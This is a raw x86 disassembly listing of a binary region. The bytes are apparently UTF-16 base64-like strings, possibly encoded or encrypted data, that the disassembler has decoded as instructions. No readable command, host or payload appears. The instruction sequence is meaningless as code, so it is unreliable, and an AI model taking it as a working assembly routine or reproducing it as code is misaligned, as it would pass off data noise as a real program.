  40b953:	69 00 6a 00 4f 00    	imul   $0x4f006a,(%eax),%eax
  40b959:	39 00                	cmp    %eax,(%eax)
  40b95b:	41                   	inc    %ecx
  40b95c:	00 78 00             	add    %bh,0x0(%eax)
  40b95f:	73 00                	jae    0x40b961
  40b961:	71 00                	jno    0x40b963
  40b963:	48                   	dec    %eax
  40b964:	00 50 00             	add    %dl,0x0(%eax)
  40b967:	52                   	push   %edx
  40b968:	00 55 00             	add    %dl,0x0(%ebp)
  40b96b:	4a                   	dec    %edx
  40b96c:	00 35 00 39 00 5a    	add    %dh,0x5a003900
  40b972:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40b976:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b97a:	00 47 00             	add    %al,0x0(%edi)
  40b97d:	6c                   	insb   (%dx),%es:(%edi)
  40b97e:	00 70 00             	add    %dh,0x0(%eax)
  40b981:	4d                   	dec    %ebp
  40b982:	00 2f                	add    %ch,(%edi)
  40b984:	00 58 00             	add    %bl,0x0(%eax)
  40b987:	5a                   	pop    %edx
  40b988:	00 56 00             	add    %dl,0x0(%esi)
  40b98b:	77 00                	ja     0x40b98d
  40b98d:	79 00                	jns    0x40b98f
  40b98f:	6a 00                	push   $0x0
  40b991:	4d                   	dec    %ebp
  40b992:	00 46 00             	add    %al,0x0(%esi)
  40b995:	4c                   	dec    %esp
  40b996:	00 76 00             	add    %dh,0x0(%esi)
  40b999:	35 00 42 00 65       	xor    $0x65004200,%eax
  40b99e:	00 32                	add    %dh,(%edx)
  40b9a0:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40b9a4:	00 39                	add    %bh,(%ecx)
  40b9a6:	00 2f                	add    %ch,(%edi)
  40b9a8:	00 2b                	add    %ch,(%ebx)
  40b9aa:	00 39                	add    %bh,(%ecx)
  40b9ac:	00 69 00             	add    %ch,0x0(%ecx)
  40b9af:	4c                   	dec    %esp
  40b9b0:	00 6f 00             	add    %ch,0x0(%edi)
  40b9b3:	41                   	inc    %ecx
  40b9b4:	00 37                	add    %dh,(%edi)
  40b9b6:	00 67 00             	add    %ah,0x0(%edi)
  40b9b9:	69 00 67 00 6b 00    	imul   $0x6b0067,(%eax),%eax
  40b9bf:	33 00                	xor    (%eax),%eax
  40b9c1:	4e                   	dec    %esi
  40b9c2:	00 7a 00             	add    %bh,0x0(%edx)
  40b9c5:	4d                   	dec    %ebp
  40b9c6:	00 32                	add    %dh,(%edx)
  40b9c8:	00 73 00             	add    %dh,0x0(%ebx)
  40b9cb:	51                   	push   %ecx
  40b9cc:	00 50 00             	add    %dl,0x0(%eax)
  40b9cf:	2f                   	das
  40b9d0:	00 67 00             	add    %ah,0x0(%edi)
  40b9d3:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40b9d7:	52                   	push   %edx
  40b9d8:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40b9dc:	00 4f 00             	add    %cl,0x0(%edi)
  40b9df:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40b9e3:	4d                   	dec    %ebp
  40b9e4:	00 79 00             	add    %bh,0x0(%ecx)
  40b9e7:	57                   	push   %edi
  40b9e8:	00 72 00             	add    %dh,0x0(%edx)
  40b9eb:	33 00                	xor    (%eax),%eax
  40b9ed:	32 00                	xor    (%eax),%al
  40b9ef:	30 00                	xor    %al,(%eax)
  40b9f1:	4b                   	dec    %ebx
  40b9f2:	00 75 00             	add    %dh,0x0(%ebp)
  40b9f5:	58                   	pop    %eax
  40b9f6:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9f9:	52                   	push   %edx
  40b9fa:	00 73 00             	add    %dh,0x0(%ebx)
  40b9fd:	36 00 4c 00 39       	add    %cl,%ss:0x39(%eax,%eax,1)
  40ba02:	00 33                	add    %dh,(%ebx)
  40ba04:	00 6e 00             	add    %ch,0x0(%esi)
  40ba07:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba08:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40ba0c:	00 67 00             	add    %ah,0x0(%edi)
  40ba0f:	62 00                	bound  %eax,(%eax)
  40ba11:	49                   	dec    %ecx
  40ba12:	00 65 00             	add    %ah,0x0(%ebp)
  40ba15:	63 00                	arpl   %eax,(%eax)
  40ba17:	7a 00                	jp     0x40ba19
  40ba19:	55                   	push   %ebp
  40ba1a:	00 33                	add    %dh,(%ebx)
  40ba1c:	00 66 00             	add    %ah,0x0(%esi)
  40ba1f:	42                   	inc    %edx
  40ba20:	00 59 00             	add    %bl,0x0(%ecx)
  40ba23:	37                   	aaa
  40ba24:	00 4e 00             	add    %cl,0x0(%esi)
  40ba27:	34 00                	xor    $0x0,%al
  40ba29:	30 00                	xor    %al,(%eax)
  40ba2b:	50                   	push   %eax
  40ba2c:	00 50 00             	add    %dl,0x0(%eax)
  40ba2f:	53                   	push   %ebx
  40ba30:	00 33                	add    %dh,(%ebx)
  40ba32:	00 68 00             	add    %ch,0x0(%eax)
  40ba35:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40ba39:	68 00 72 00 63       	push   $0x63007200
  40ba3e:	00 45 00             	add    %al,0x0(%ebp)
  40ba41:	43                   	inc    %ebx
  40ba42:	00 35 00 74 00 41    	add    %dh,0x41007400
  40ba48:	00 6b 00             	add    %ch,0x0(%ebx)
  40ba4b:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40ba4f:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40ba53:	42                   	inc    %edx
  40ba54:	00 37                	add    %dh,(%edi)
  40ba56:	00 51 00             	add    %dl,0x0(%ecx)
  40ba59:	63 00                	arpl   %eax,(%eax)
  40ba5b:	49                   	dec    %ecx
  40ba5c:	00 46 00             	add    %al,0x0(%esi)
  40ba5f:	2b 00                	sub    (%eax),%eax
  40ba61:	78 00                	js     0x40ba63
  40ba63:	52                   	push   %edx
  40ba64:	00 41 00             	add    %al,0x0(%ecx)
  40ba67:	6d                   	insl   (%dx),%es:(%edi)
  40ba68:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40ba6c:	00 31                	add    %dh,(%ecx)
  40ba6e:	00 39                	add    %bh,(%ecx)
  40ba70:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40ba74:	00 6b 00             	add    %ch,0x0(%ebx)
  40ba77:	37                   	aaa
  40ba78:	00 71 00             	add    %dh,0x0(%ecx)
  40ba7b:	46                   	inc    %esi
  40ba7c:	00 6e 00             	add    %ch,0x0(%esi)
  40ba7f:	4e                   	dec    %esi
  40ba80:	00 42 00             	add    %al,0x0(%edx)
  40ba83:	32 00                	xor    (%eax),%al
  40ba85:	34 00                	xor    $0x0,%al
  40ba87:	46                   	inc    %esi
  40ba88:	00 79 00             	add    %bh,0x0(%ecx)
  40ba8b:	78 00                	js     0x40ba8d
  40ba8d:	79 00                	jns    0x40ba8f
  40ba8f:	54                   	push   %esp
  40ba90:	00 75 00             	add    %dh,0x0(%ebp)
  40ba93:	47                   	inc    %edi
  40ba94:	00 31                	add    %dh,(%ecx)
  40ba96:	00 33                	add    %dh,(%ebx)
  40ba98:	00 5a 00             	add    %bl,0x0(%edx)
  40ba9b:	59                   	pop    %ecx
  40ba9c:	00 71 00             	add    %dh,0x0(%ecx)
  40ba9f:	52                   	push   %edx
  40baa0:	00 6d 00             	add    %ch,0x0(%ebp)
  40baa3:	70 00                	jo     0x40baa5
  40baa5:	48                   	dec    %eax
  40baa6:	00 65 00             	add    %ah,0x0(%ebp)
  40baa9:	58                   	pop    %eax
  40baaa:	00 4a 00             	add    %cl,0x0(%edx)
  40baad:	75 00                	jne    0x40baaf
  40baaf:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40bab3:	72 00                	jb     0x40bab5
  40bab5:	74 00                	je     0x40bab7
  40bab7:	43                   	inc    %ebx
  40bab8:	00 42 00             	add    %al,0x0(%edx)
  40babb:	73 00                	jae    0x40babd
  40babd:	4f                   	dec    %edi
  40babe:	00 46 00             	add    %al,0x0(%esi)
  40bac1:	76 00                	jbe    0x40bac3
  40bac3:	77 00                	ja     0x40bac5
  40bac5:	32 00                	xor    (%eax),%al
  40bac7:	48                   	dec    %eax
  40bac8:	00 47 00             	add    %al,0x0(%edi)
  40bacb:	63 00                	arpl   %eax,(%eax)
  40bacd:	52                   	push   %edx
  40bace:	00 49 00             	add    %cl,0x0(%ecx)
  40bad1:	79 00                	jns    0x40bad3
  40bad3:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40bad7:	7a 00                	jp     0x40bad9
  40bad9:	54                   	push   %esp
  40bada:	00 71 00             	add    %dh,0x0(%ecx)
  40badd:	35 00 6e 00 45       	xor    $0x45006e00,%eax
  40bae2:	00 53 00             	add    %dl,0x0(%ebx)
  40bae5:	71 00                	jno    0x40bae7
  40bae7:	78 00                	js     0x40bae9
  40bae9:	38 00                	cmp    %al,(%eax)
  40baeb:	4c                   	dec    %esp
  40baec:	00 50 00             	add    %dl,0x0(%eax)
  40baef:	74 00                	je     0x40baf1
  40baf1:	61                   	popa
  40baf2:	00 72 00             	add    %dh,0x0(%edx)
  40baf5:	77 00                	ja     0x40baf7
  40baf7:	6e                   	outsb  %ds:(%esi),(%dx)
  40baf8:	00 77 00             	add    %dh,0x0(%edi)
  40bafb:	30 00                	xor    %al,(%eax)
  40bafd:	57                   	push   %edi
  40bafe:	00 57 00             	add    %dl,0x0(%edi)
  40bb01:	5a                   	pop    %edx
  40bb02:	00 66 00             	add    %ah,0x0(%esi)
  40bb05:	65 00 64 00 75       	add    %ah,%gs:0x75(%eax,%eax,1)
  40bb0a:	00 4a 00             	add    %cl,0x0(%edx)
  40bb0d:	4d                   	dec    %ebp
  40bb0e:	00 49 00             	add    %cl,0x0(%ecx)
  40bb11:	67 00 77 00          	add    %dh,0x0(%bx)
  40bb15:	45                   	inc    %ebp
  40bb16:	00 79 00             	add    %bh,0x0(%ecx)
  40bb19:	57                   	push   %edi
  40bb1a:	00 43 00             	add    %al,0x0(%ebx)
  40bb1d:	48                   	dec    %eax
  40bb1e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb21:	4e                   	dec    %esi
  40bb22:	00 4a 00             	add    %cl,0x0(%edx)
  40bb25:	35 00 33 00 77       	xor    $0x77003300,%eax
  40bb2a:	00 46 00             	add    %al,0x0(%esi)
  40bb2d:	58                   	pop    %eax
  40bb2e:	00 71 00             	add    %dh,0x0(%ecx)
  40bb31:	39 00                	cmp    %eax,(%eax)
  40bb33:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40bb37:	6b 00 67             	imul   $0x67,(%eax),%eax
  40bb3a:	00 72 00             	add    %dh,0x0(%edx)
  40bb3d:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40bb41:	32 00                	xor    (%eax),%al
  40bb43:	61                   	popa
  40bb44:	00 48 00             	add    %cl,0x0(%eax)
  40bb47:	53                   	push   %ebx
  40bb48:	00 33                	add    %dh,(%ebx)
  40bb4a:	00 75 00             	add    %dh,0x0(%ebp)
  40bb4d:	37                   	aaa
  40bb4e:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb51:	42                   	inc    %edx
  40bb52:	00 4f 00             	add    %cl,0x0(%edi)
  40bb55:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40bb59:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40bb5c:	00 30                	add    %dh,(%eax)
  40bb5e:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40bb62:	00 42 00             	add    %al,0x0(%edx)
  40bb65:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40bb69:	4c                   	dec    %esp
  40bb6a:	00 69 00             	add    %ch,0x0(%ecx)
  40bb6d:	70 00                	jo     0x40bb6f
  40bb6f:	50                   	push   %eax
  40bb70:	00 43 00             	add    %al,0x0(%ebx)
  40bb73:	30 00                	xor    %al,(%eax)
  40bb75:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40bb79:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40bb7d:	65 00 2b             	add    %ch,%gs:(%ebx)
  40bb80:	00 43 00             	add    %al,0x0(%ebx)
  40bb83:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb84:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40bb88:	00 36                	add    %dh,(%esi)
  40bb8a:	00 59 00             	add    %bl,0x0(%ecx)
  40bb8d:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40bb91:	4b                   	dec    %ebx
  40bb92:	00 43 00             	add    %al,0x0(%ebx)
  40bb95:	47                   	inc    %edi
  40bb96:	00 48 00             	add    %cl,0x0(%eax)
  40bb99:	53                   	push   %ebx
  40bb9a:	00 71 00             	add    %dh,0x0(%ecx)
  40bb9d:	69 00 2b 00 44 00    	imul   $0x44002b,(%eax),%eax
  40bba3:	68 00 41 00 67       	push   $0x67004100
  40bba8:	00 2b                	add    %ch,(%ebx)
  40bbaa:	00 62 00             	add    %ah,0x0(%edx)
  40bbad:	48                   	dec    %eax
  40bbae:	00 78 00             	add    %bh,0x0(%eax)
  40bbb1:	4c                   	dec    %esp
  40bbb2:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40bbb6:	00 78 00             	add    %bh,0x0(%eax)
  40bbb9:	46                   	inc    %esi
  40bbba:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bbbd:	32 00                	xor    (%eax),%al
  40bbbf:	31 00                	xor    %eax,(%eax)
  40bbc1:	6d                   	insl   (%dx),%es:(%edi)
  40bbc2:	00 36                	add    %dh,(%esi)
  40bbc4:	00 65 00             	add    %ah,0x0(%ebp)
  40bbc7:	55                   	push   %ebp
  40bbc8:	00 59 00             	add    %bl,0x0(%ecx)
  40bbcb:	74 00                	je     0x40bbcd
  40bbcd:	54                   	push   %esp
  40bbce:	00 72 00             	add    %dh,0x0(%edx)
  40bbd1:	38 00                	cmp    %al,(%eax)
  40bbd3:	38 00                	cmp    %al,(%eax)
  40bbd5:	4e                   	dec    %esi
  40bbd6:	00 33                	add    %dh,(%ebx)
  40bbd8:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40bbdc:	00 6f 00             	add    %ch,0x0(%edi)
  40bbdf:	47                   	inc    %edi
  40bbe0:	00 62 00             	add    %ah,0x0(%edx)
  40bbe3:	2b 00                	sub    (%eax),%eax
  40bbe5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbe6:	00 6e 00             	add    %ch,0x0(%esi)
  40bbe9:	72 00                	jb     0x40bbeb
  40bbeb:	4c                   	dec    %esp
  40bbec:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40bbf0:	00 4a 00             	add    %cl,0x0(%edx)
  40bbf3:	52                   	push   %edx
  40bbf4:	00 77 00             	add    %dh,0x0(%edi)
  40bbf7:	4e                   	dec    %esi
  40bbf8:	00 48 00             	add    %cl,0x0(%eax)
  40bbfb:	57                   	push   %edi
  40bbfc:	00 63 00             	add    %ah,0x0(%ebx)
  40bbff:	30 00                	xor    %al,(%eax)
  40bc01:	76 00                	jbe    0x40bc03
  40bc03:	61                   	popa
  40bc04:	00 46 00             	add    %al,0x0(%esi)
  40bc07:	43                   	inc    %ebx
  40bc08:	00 32                	add    %dh,(%edx)
  40bc0a:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40bc0e:	00 4e 00             	add    %cl,0x0(%esi)
  40bc11:	37                   	aaa
  40bc12:	00 78 00             	add    %bh,0x0(%eax)
  40bc15:	70 00                	jo     0x40bc17
  40bc17:	4e                   	dec    %esi
  40bc18:	00 48 00             	add    %cl,0x0(%eax)
  40bc1b:	73 00                	jae    0x40bc1d
  40bc1d:	55                   	push   %ebp
  40bc1e:	00 69 00             	add    %ch,0x0(%ecx)
  40bc21:	70 00                	jo     0x40bc23
  40bc23:	55                   	push   %ebp
  40bc24:	00 63 00             	add    %ah,0x0(%ebx)
  40bc27:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc28:	00 79 00             	add    %bh,0x0(%ecx)
  40bc2b:	59                   	pop    %ecx
  40bc2c:	00 76 00             	add    %dh,0x0(%esi)
  40bc2f:	63 00                	arpl   %eax,(%eax)
  40bc31:	47                   	inc    %edi
  40bc32:	00 47 00             	add    %al,0x0(%edi)
  40bc35:	31 00                	xor    %eax,(%eax)
  40bc37:	74 00                	je     0x40bc39
  40bc39:	53                   	push   %ebx
  40bc3a:	00 43 00             	add    %al,0x0(%ebx)
  40bc3d:	33 00                	xor    (%eax),%eax
  40bc3f:	70 00                	jo     0x40bc41
  40bc41:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40bc45:	2f                   	das
  40bc46:	00 6f 00             	add    %ch,0x0(%edi)
  40bc49:	32 00                	xor    (%eax),%al
  40bc4b:	6a 00                	push   $0x0
  40bc4d:	4a                   	dec    %edx
  40bc4e:	00 31                	add    %dh,(%ecx)
  40bc50:	00 42 00             	add    %al,0x0(%edx)
  40bc53:	51                   	push   %ecx
  40bc54:	00 2b                	add    %ch,(%ebx)
  40bc56:	00 63 00             	add    %ah,0x0(%ebx)
  40bc59:	31 00                	xor    %eax,(%eax)
  40bc5b:	54                   	push   %esp
  40bc5c:	00 56 00             	add    %dl,0x0(%esi)
  40bc5f:	74 00                	je     0x40bc61
  40bc61:	57                   	push   %edi
  40bc62:	00 6f 00             	add    %ch,0x0(%edi)
  40bc65:	44                   	inc    %esp
  40bc66:	00 41 00             	add    %al,0x0(%ecx)
  40bc69:	52                   	push   %edx
  40bc6a:	00 2b                	add    %ch,(%ebx)
  40bc6c:	00 4a 00             	add    %cl,0x0(%edx)
  40bc6f:	7a 00                	jp     0x40bc71
  40bc71:	53                   	push   %ebx
  40bc72:	00 59 00             	add    %bl,0x0(%ecx)
  40bc75:	55                   	push   %ebp
  40bc76:	00 2f                	add    %ch,(%edi)
  40bc78:	00 31                	add    %dh,(%ecx)
  40bc7a:	00 43 00             	add    %al,0x0(%ebx)
  40bc7d:	71 00                	jno    0x40bc7f
  40bc7f:	72 00                	jb     0x40bc81
  40bc81:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40bc85:	39 00                	cmp    %eax,(%eax)
  40bc87:	76 00                	jbe    0x40bc89
  40bc89:	54                   	push   %esp
  40bc8a:	00 4f 00             	add    %cl,0x0(%edi)
  40bc8d:	45                   	inc    %ebp
  40bc8e:	00 48 00             	add    %cl,0x0(%eax)
  40bc91:	46                   	inc    %esi
  40bc92:	00 70 00             	add    %dh,0x0(%eax)
  40bc95:	42                   	inc    %edx
  40bc96:	00 4f 00             	add    %cl,0x0(%edi)
  40bc99:	45                   	inc    %ebp
  40bc9a:	00 4a 00             	add    %cl,0x0(%edx)
  40bc9d:	38 00                	cmp    %al,(%eax)
  40bc9f:	49                   	dec    %ecx
  40bca0:	00 77 00             	add    %dh,0x0(%edi)
  40bca3:	35 00 48 00 4c       	xor    $0x4c004800,%eax
  40bca8:	00 4f 00             	add    %cl,0x0(%edi)
  40bcab:	2b 00                	sub    (%eax),%eax
  40bcad:	45                   	inc    %ebp
  40bcae:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40bcb2:	00 79 00             	add    %bh,0x0(%ecx)
  40bcb5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcb6:	00 55 00             	add    %dl,0x0(%ebp)
  40bcb9:	4d                   	dec    %ebp
  40bcba:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40bcbe:	00 47 00             	add    %al,0x0(%edi)
  40bcc1:	49                   	dec    %ecx
  40bcc2:	00 55 00             	add    %dl,0x0(%ebp)
  40bcc5:	45                   	inc    %ebp
  40bcc6:	00 61 00             	add    %ah,0x0(%ecx)
  40bcc9:	68 00 53 00 58       	push   $0x58005300
  40bcce:	00 55 00             	add    %dl,0x0(%ebp)
  40bcd1:	34 00                	xor    $0x0,%al
  40bcd3:	44                   	inc    %esp
  40bcd4:	00 6e 00             	add    %ch,0x0(%esi)
  40bcd7:	34 00                	xor    $0x0,%al
  40bcd9:	36 00 54 00 46       	add    %dl,%ss:0x46(%eax,%eax,1)
  40bcde:	00 55 00             	add    %dl,0x0(%ebp)
  40bce1:	4d                   	dec    %ebp
  40bce2:	00 68 00             	add    %ch,0x0(%eax)
  40bce5:	55                   	push   %ebp
  40bce6:	00 62 00             	add    %ah,0x0(%edx)
  40bce9:	2f                   	das
  40bcea:	00 6b 00             	add    %ch,0x0(%ebx)
  40bced:	62 00                	bound  %eax,(%eax)
  40bcef:	67 00 35             	add    %dh,(%di)
  40bcf2:	00 6a 00             	add    %ch,0x0(%edx)
  40bcf5:	32 00                	xor    (%eax),%al
  40bcf7:	73 00                	jae    0x40bcf9
  40bcf9:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40bcfd:	69 00 51 00 72 00    	imul   $0x720051,(%eax),%eax
  40bd03:	30 00                	xor    %al,(%eax)
  40bd05:	51                   	push   %ecx
  40bd06:	00 4e 00             	add    %cl,0x0(%esi)
  40bd09:	57                   	push   %edi
  40bd0a:	00 38                	add    %bh,(%eax)
  40bd0c:	00 59 00             	add    %bl,0x0(%ecx)
  40bd0f:	31 00                	xor    %eax,(%eax)
  40bd11:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd12:	00 65 00             	add    %ah,0x0(%ebp)
  40bd15:	4f                   	dec    %edi
  40bd16:	00 7a 00             	add    %bh,0x0(%edx)
  40bd19:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40bd1d:	44                   	inc    %esp
  40bd1e:	00 76 00             	add    %dh,0x0(%esi)
  40bd21:	50                   	push   %eax
  40bd22:	00 53 00             	add    %dl,0x0(%ebx)
  40bd25:	78 00                	js     0x40bd27
  40bd27:	4a                   	dec    %edx
  40bd28:	00 63 00             	add    %ah,0x0(%ebx)
  40bd2b:	30 00                	xor    %al,(%eax)
  40bd2d:	2b 00                	sub    (%eax),%eax
  40bd2f:	45                   	inc    %ebp
  40bd30:	00 72 00             	add    %dh,0x0(%edx)
  40bd33:	75 00                	jne    0x40bd35
  40bd35:	71 00                	jno    0x40bd37
  40bd37:	44                   	inc    %esp
  40bd38:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd3b:	52                   	push   %edx
  40bd3c:	00 75 00             	add    %dh,0x0(%ebp)
  40bd3f:	61                   	popa
  40bd40:	00 61 00             	add    %ah,0x0(%ecx)
  40bd43:	6d                   	insl   (%dx),%es:(%edi)
  40bd44:	00 33                	add    %dh,(%ebx)
  40bd46:	00 76 00             	add    %dh,0x0(%esi)
  40bd49:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40bd4d:	4a                   	dec    %edx
  40bd4e:	00 2f                	add    %ch,(%edi)
  40bd50:	00 78 00             	add    %bh,0x0(%eax)
  40bd53:	2b 00                	sub    (%eax),%eax
  40bd55:	72 00                	jb     0x40bd57
  40bd57:	32 00                	xor    (%eax),%al
  40bd59:	56                   	push   %esi
  40bd5a:	00 35 00 4e 00 56    	add    %dh,0x56004e00
  40bd60:	00 71 00             	add    %dh,0x0(%ecx)
  40bd63:	48                   	dec    %eax
  40bd64:	00 30                	add    %dh,(%eax)
  40bd66:	00 48 00             	add    %cl,0x0(%eax)
  40bd69:	35 00 35 00 65       	xor    $0x65003500,%eax
  40bd6e:	00 42 00             	add    %al,0x0(%edx)
  40bd71:	71 00                	jno    0x40bd73
  40bd73:	38 00                	cmp    %al,(%eax)
  40bd75:	61                   	popa
  40bd76:	00 4f 00             	add    %cl,0x0(%edi)
  40bd79:	32 00                	xor    (%eax),%al
  40bd7b:	48                   	dec    %eax
  40bd7c:	00 7a 00             	add    %bh,0x0(%edx)
  40bd7f:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40bd83:	79 00                	jns    0x40bd85
  40bd85:	59                   	pop    %ecx
  40bd86:	00 46 00             	add    %al,0x0(%esi)
  40bd89:	70 00                	jo     0x40bd8b
  40bd8b:	77 00                	ja     0x40bd8d
  40bd8d:	47                   	inc    %edi
  40bd8e:	00 6a 00             	add    %ch,0x0(%edx)
  40bd91:	4e                   	dec    %esi
  40bd92:	00 39                	add    %bh,(%ecx)
  40bd94:	00 65 00             	add    %ah,0x0(%ebp)
  40bd97:	43                   	inc    %ebx
  40bd98:	00 41 00             	add    %al,0x0(%ecx)
  40bd9b:	63 00                	arpl   %eax,(%eax)
  40bd9d:	6c                   	insb   (%dx),%es:(%edi)
  40bd9e:	00 51 00             	add    %dl,0x0(%ecx)
  40bda1:	73 00                	jae    0x40bda3
  40bda3:	2f                   	das
  40bda4:	00 68 00             	add    %ch,0x0(%eax)
  40bda7:	37                   	aaa
  40bda8:	00 4d 00             	add    %cl,0x0(%ebp)
  40bdab:	75 00                	jne    0x40bdad
  40bdad:	43                   	inc    %ebx
  40bdae:	00 4d 00             	add    %cl,0x0(%ebp)
  40bdb1:	2b 00                	sub    (%eax),%eax
  40bdb3:	30 00                	xor    %al,(%eax)
  40bdb5:	63 00                	arpl   %eax,(%eax)
  40bdb7:	43                   	inc    %ebx
  40bdb8:	00 41 00             	add    %al,0x0(%ecx)
  40bdbb:	56                   	push   %esi
  40bdbc:	00 4e 00             	add    %cl,0x0(%esi)
  40bdbf:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40bdc3:	4a                   	dec    %edx
  40bdc4:	00 53 00             	add    %dl,0x0(%ebx)
  40bdc7:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40bdcb:	50                   	push   %eax
  40bdcc:	00 61 00             	add    %ah,0x0(%ecx)
  40bdcf:	30 00                	xor    %al,(%eax)
  40bdd1:	2f                   	das
  40bdd2:	00 4a 00             	add    %cl,0x0(%edx)
  40bdd5:	66 00 4c 00 4e       	data16 add %cl,0x4e(%eax,%eax,1)
  40bdda:	00 70 00             	add    %dh,0x0(%eax)
  40bddd:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bde1:	48                   	dec    %eax
  40bde2:	00 77 00             	add    %dh,0x0(%edi)
  40bde5:	7a 00                	jp     0x40bde7
  40bde7:	47                   	inc    %edi
  40bde8:	00 63 00             	add    %ah,0x0(%ebx)
  40bdeb:	6c                   	insb   (%dx),%es:(%edi)
  40bdec:	00 4a 00             	add    %cl,0x0(%edx)
  40bdef:	61                   	popa
  40bdf0:	00 48 00             	add    %cl,0x0(%eax)
  40bdf3:	7a 00                	jp     0x40bdf5
  40bdf5:	33 00                	xor    (%eax),%eax
  40bdf7:	4a                   	dec    %edx
  40bdf8:	00 7a 00             	add    %bh,0x0(%edx)
  40bdfb:	4c                   	dec    %esp
  40bdfc:	00 78 00             	add    %bh,0x0(%eax)
  40bdff:	53                   	push   %ebx
  40be00:	00 35 00 59 00 6c    	add    %dh,0x6c005900
  40be06:	00 61 00             	add    %ah,0x0(%ecx)
  40be09:	78 00                	js     0x40be0b
  40be0b:	57                   	push   %edi
  40be0c:	00 7a 00             	add    %bh,0x0(%edx)
  40be0f:	4f                   	dec    %edi
  40be10:	00 52 00             	add    %dl,0x0(%edx)
  40be13:	77 00                	ja     0x40be15
  40be15:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40be1a:	80 b1 69 00 69 00 73 	xorb   $0x73,0x690069(%ecx)
  40be21:	00 56 00             	add    %dl,0x0(%esi)
  40be24:	70 00                	jo     0x40be26
  40be26:	55                   	push   %ebp
  40be27:	00 77 00             	add    %dh,0x0(%edi)
  40be2a:	2f                   	das
  40be2b:	00 72 00             	add    %dh,0x0(%edx)
  40be2e:	34 00                	xor    $0x0,%al
  40be30:	59                   	pop    %ecx
  40be31:	00 65 00             	add    %ah,0x0(%ebp)
  40be34:	74 00                	je     0x40be36
  40be36:	45                   	inc    %ebp
  40be37:	00 4e 00             	add    %cl,0x0(%esi)
  40be3a:	54                   	push   %esp
  40be3b:	00 79 00             	add    %bh,0x0(%ecx)
  40be3e:	54                   	push   %esp
  40be3f:	00 31                	add    %dh,(%ecx)
  40be41:	00 59 00             	add    %bl,0x0(%ecx)
  40be44:	56                   	push   %esi
  40be45:	00 43 00             	add    %al,0x0(%ebx)
  40be48:	49                   	dec    %ecx
  40be49:	00 6a 00             	add    %ch,0x0(%edx)
  40be4c:	4c                   	dec    %esp
  40be4d:	00 68 00             	add    %ch,0x0(%eax)
  40be50:	59                   	pop    %ecx
  40be51:	00 4d 00             	add    %cl,0x0(%ebp)
  40be54:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40be57:	00 6d 00             	add    %ch,0x0(%ebp)
  40be5a:	6e                   	outsb  %ds:(%esi),(%dx)
  40be5b:	00 7a 00             	add    %bh,0x0(%edx)
  40be5e:	4c                   	dec    %esp
  40be5f:	00 4e 00             	add    %cl,0x0(%esi)
  40be62:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40be66:	61                   	popa
  40be67:	00 6e 00             	add    %ch,0x0(%esi)
  40be6a:	54                   	push   %esp
  40be6b:	00 30                	add    %dh,(%eax)
  40be6d:	00 67 00             	add    %ah,0x0(%edi)
  40be70:	48                   	dec    %eax
  40be71:	00 6d 00             	add    %ch,0x0(%ebp)
  40be74:	2f                   	das
  40be75:	00 46 00             	add    %al,0x0(%esi)
  40be78:	68 00 74 00 6e       	push   $0x6e007400
  40be7d:	00 50 00             	add    %dl,0x0(%eax)
  40be80:	75 00                	jne    0x40be82
  40be82:	75 00                	jne    0x40be84
  40be84:	51                   	push   %ecx
  40be85:	00 62 00             	add    %ah,0x0(%edx)
  40be88:	70 00                	jo     0x40be8a
  40be8a:	6e                   	outsb  %ds:(%esi),(%dx)
  40be8b:	00 42 00             	add    %al,0x0(%edx)
  40be8e:	79 00                	jns    0x40be90
  40be90:	55                   	push   %ebp
  40be91:	00 78 00             	add    %bh,0x0(%eax)
  40be94:	57                   	push   %edi
